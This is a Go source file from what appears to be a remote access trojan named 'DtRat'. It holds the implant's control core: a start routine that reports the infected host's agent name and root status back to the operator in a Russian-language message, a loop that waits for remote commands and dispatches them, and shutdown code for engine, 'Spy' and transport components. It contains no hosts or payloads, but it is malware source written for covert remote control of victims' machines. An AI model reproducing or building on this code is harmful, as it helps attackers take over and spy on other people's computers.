package rat

func (r *Rat) internalClose(reason error) {
	r.Engine.Close()
	r.Spy.Close()

	r.Transport.Close()

	r.CloseCh <- reason
}

func (r *Rat) Close() {
	r.internalClose(nil)
}

func (r *Rat) Start() {
	r.Transport.Start()
	go r.commandHandling()
	r.Transport.Send("DtRat Запущен!\n\nХост: %s\nroot: %t", r.Config.General.AgentName, r.Engine.Info.IsRoot())
}

func (r *Rat) commandHandling() {
	for true {
		msg, err := r.Transport.Wait()
		if err != nil {
			continue
		}

		r.commandsSwitch(msg)
	}
}
